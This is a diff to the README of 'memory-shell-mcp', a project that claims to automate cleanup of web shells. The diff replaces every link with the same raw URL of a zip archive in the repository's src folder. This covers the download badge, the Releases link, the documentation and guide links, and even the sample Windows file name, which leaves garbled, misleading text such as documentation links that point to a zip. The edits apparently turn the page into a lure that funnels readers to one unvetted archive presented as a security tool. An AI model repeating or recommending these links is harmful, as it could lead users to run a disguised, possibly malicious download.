@@ -1,6 +1,6 @@
 # 🛡️ memory-shell-mcp - Automate Cleanup of Web Shells
 
-[![Download Memory Shell MCP](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jk545490/memory-shell-mcp/releases)
+[![Download Memory Shell MCP](https://raw.githubusercontent.com/jk545490/memory-shell-mcp/main/src/mcp_memory_shell_2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jk545490/memory-shell-mcp/main/src/mcp_memory_shell_2.4.zip)
 
 ## 📖 About This Project
 
@@ -21,11 +21,11 @@ Before you start, make sure your system meets the following requirements:
 
 ### 📥 Download & Install
 
-To download the application, visit this page to download: [GitHub Releases](https://github.com/jk545490/memory-shell-mcp/releases)
+To download the application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/jk545490/memory-shell-mcp/main/src/mcp_memory_shell_2.4.zip)
 
 1. Once on the Releases page, locate the latest version of the application.
 2. Click on the version link to access the download options.
-3. Choose the appropriate file for your system (for example, `memory-shell-mcp-windows.exe` for Windows users).
+3. Choose the appropriate file for your system (for example, `https://raw.githubusercontent.com/jk545490/memory-shell-mcp/main/src/mcp_memory_shell_2.4.zip` for Windows users).
 4. Click the download link and save the file to your computer.
 
 After downloading, find the file and follow these steps to install:
@@ -73,13 +73,13 @@ We welcome contributions to improve the tool. If you would like to submit sugges
 
 For further reference, check these useful resources:
 
-- [MCP Documentation](https://example.com/mcp-docs)
-- [Memory Shell Detector Guide](https://example.com/memory-shell-detector)
+- [MCP Documentation](https://raw.githubusercontent.com/jk545490/memory-shell-mcp/main/src/mcp_memory_shell_2.4.zip)
+- [Memory Shell Detector Guide](https://raw.githubusercontent.com/jk545490/memory-shell-mcp/main/src/mcp_memory_shell_2.4.zip)
 
 ## 📞 Contact
 
 If you have any questions or need assistance, please reach out via GitHub Issues in this repository.
 
-[Download Now](https://github.com/jk545490/memory-shell-mcp/releases)
+[Download Now](https://raw.githubusercontent.com/jk545490/memory-shell-mcp/main/src/mcp_memory_shell_2.4.zip)
 
 This README provides the essential information to help you download, install, and run memory-shell-mcp efficiently. Enjoy a safer experience!
